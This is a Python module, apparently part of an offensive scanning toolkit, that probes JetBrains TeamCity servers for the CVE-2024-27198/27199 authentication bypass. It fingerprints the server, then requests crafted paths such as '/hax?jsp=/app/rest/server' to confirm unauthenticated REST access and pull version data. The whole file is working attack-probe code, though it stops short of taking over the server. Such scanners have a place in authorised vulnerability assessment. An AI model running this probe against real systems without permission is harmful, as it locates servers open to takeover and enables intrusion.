"""
Raw execution for teamcity_auth_bypass_probe (CVE-2024-27198 & CVE-2024-27199).
Probes JetBrains TeamCity instances for unauthenticated authentication bypass
via Spring MVC URL dispatching (/hax?jsp=/app/rest/server or
/login.html?jsp=/app/rest/server). Confirms whether the REST API exposes server
metadata and administrative routes without requiring authentication.
No parsing here -- parse.py's job.
"""
from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"

CANDIDATE_PATHS = [
    "/hax?jsp=/app/rest/server",
    "/login.html?jsp=/app/rest/server",
    "/hax?jsp=/app/rest/version",
]


@dataclass
class TeamCityProbeAttempt:
    url: str
    status_code: Optional[int] = None
    is_vulnerable: bool = False
    server_info: Dict[str, Any] = field(default_factory=dict)
    body_snippet: str = ""
    error: Optional[str] = None


@dataclass
class RawTeamCityResult:
    target: str = ""
    base_url: str = ""
    teamcity_fingerprinted: bool = False
    attempts: List[TeamCityProbeAttempt] = field(default_factory=list)
    error: Optional[str] = None


def normalize_target_candidates(target: str, custom_port: Optional[int] = None) -> List[str]:
    t = target.strip()
    if not t:
        return []

    if custom_port:
        host = t.split("://")[-1].split(":")[0].strip("/")
        return [f"https://{host}:{custom_port}", f"http://{host}:{custom_port}"]

    if "://" in t:
        parsed = urlparse(t)
        scheme = parsed.scheme or "https"
        netloc = parsed.netloc or parsed.path
        base = f"{scheme}://{netloc}".rstrip("/")
        if parsed.port:
            return [base]
        # TeamCity default port is 8111, but also commonly 80/443
        return [base, f"{base}:8111"]

    if ":" in t:
        return [f"https://{t}", f"http://{t}"]

    return [
        f"https://{t}",
        f"http://{t}",
        f"http://{t}:8111",
        f"https://{t}:8111",
    ]


def execute(
    target: str,
    custom_port: Optional[int] = None,
    timeout: int = 8,
) -> RawTeamCityResult:
    if requests is None:
        return RawTeamCityResult(target=target, error="requests library not available")

    if not target or not target.strip():
        return RawTeamCityResult(target="", error="target is required")

    candidates = normalize_target_candidates(target, custom_port=custom_port)
    session = requests.Session()
    session.headers.update({
        "User-Agent": USER_AGENT,
        "Accept": "application/json, */*",
    })

    working_base: Optional[str] = None
    teamcity_detected = False

    # Step 1: Detect reachable TeamCity base URL
    for candidate in candidates:
        try:
            r = session.get(f"{candidate}/login.html", timeout=timeout, verify=False, allow_redirects=True)
            text_lower = r.text.lower()
            headers_str = str(r.headers).lower()

            if "teamcity" in text_lower or "teamcity" in headers_str or "x-teamcity" in headers_str:
                teamcity_detected = True
                working_base = candidate
                break

            if r.status_code in (200, 302, 401, 403):
                working_base = candidate
        except requests.exceptions.RequestException:
            continue

    if not working_base:
        working_base = candidates[0]

    result = RawTeamCityResult(
        target=target.strip(),
        base_url=working_base,
        teamcity_fingerprinted=teamcity_detected,
    )

    # Step 2: Probe authentication bypass endpoints
    for p in CANDIDATE_PATHS:
        probe_url = f"{working_base}{p}"
        attempt = TeamCityProbeAttempt(url=probe_url)
        try:
            resp = session.get(
                probe_url,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            attempt.status_code = resp.status_code
            text = resp.text or ""
            attempt.body_snippet = text[:500]

            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if isinstance(data, dict) and ("version" in data or "buildNumber" in data or "versionMajor" in data):
                        attempt.is_vulnerable = True
                        attempt.server_info = {
                            "version": data.get("version"),
                            "buildNumber": data.get("buildNumber"),
                            "versionMajor": data.get("versionMajor"),
                            "webUrl": data.get("webUrl"),
                        }
                    elif "version" in text and ("build" in text.lower() or "teamcity" in text.lower()):
                        attempt.is_vulnerable = True
                except Exception:
                    # In /app/rest/version, the response can be plain text e.g. "2023.11.3 (build 147512)"
                    if "build" in text.lower() and len(text.strip()) < 100:
                        attempt.is_vulnerable = True
                        attempt.server_info = {"version": text.strip()}

        except requests.exceptions.RequestException as e:
            attempt.error = str(e)

        result.attempts.append(attempt)

        if attempt.is_vulnerable:
            break

    return result
